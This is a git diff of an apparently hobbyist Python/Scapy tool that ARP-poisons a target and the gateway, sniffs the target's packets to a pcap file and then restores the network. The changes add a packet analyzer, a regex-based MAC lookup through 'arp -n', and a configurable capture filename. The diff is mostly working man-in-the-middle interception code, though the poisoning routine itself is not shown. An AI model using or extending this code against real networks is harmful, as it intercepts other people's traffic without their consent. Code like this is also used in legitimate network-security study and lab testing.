@@ -5,18 +5,22 @@ import threading
 import time
 import netifaces
 import platform
+import Analyzer
+from subprocess import Popen, PIPE
+import re
 
 
 class Sniffer:
 
     packet_count = 1000
     interface = "en0"
+    analyzer = Analyzer.Analyzer()
 
     # Scapy configs; verbosity and interface
     conf.verb = False
     conf.iface = interface
 
-    def __init__(self, target_ip):
+    def __init__(self, target_ip, filename):
 
         self.target_ip = target_ip
         self.target_mac = Sniffer.get_mac_from_ip(target_ip)
@@ -24,15 +28,25 @@ class Sniffer:
         self.gateway_ip = netifaces.gateways()['default'][netifaces.AF_INET][0]
         self.gateway_mac = Sniffer.get_mac_from_ip(self.gateway_ip)
 
+        self.filename = filename
+
         self.poisoning = False
 
     @staticmethod
-    def get_mac_from_ip(ip_addr):
-        response, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_addr), retry=3, timeout=5)
+    def get_mac_from_ip2(ip_addr):
+        response, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_addr), retry=3, timeout=3)
         for s, r in response:
             return r[ARP].hwsrc
 
         return None
+
+    @staticmethod
+    def get_mac_from_ip(ip_addr):
+        pid = Popen(["arp", "-n", ip_addr], stdout=PIPE)
+        s = pid.communicate()[0].decode("utf-8")
+        mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
+        return mac
+
 
     # Send correct ARP packets to the router and target so network is restored
     def restore_network(self):
@@ -65,6 +79,10 @@ class Sniffer:
         else:
             print("Unsupported OS !")
 
+    def analyze_packet(self, packet):
+        self.analyzer.analyze_packet(packet)
+
+
     # Sniff all packets and save to a file.
     # Restores the network after poisoning
     def sniff_packets(self, packet_count):
@@ -82,7 +100,7 @@ class Sniffer:
             # Filter syntax is Berkeley Packet Filter syntax (BPF)
             filter = "ip host " + self.target_ip
             packets = sniff(filter=filter, iface=self.interface, count=packet_count)
-            wrpcap("capture.pcap", packets)
+            wrpcap(self.filename, packets)
             self.poisoning = False
             self.restore_network()
 
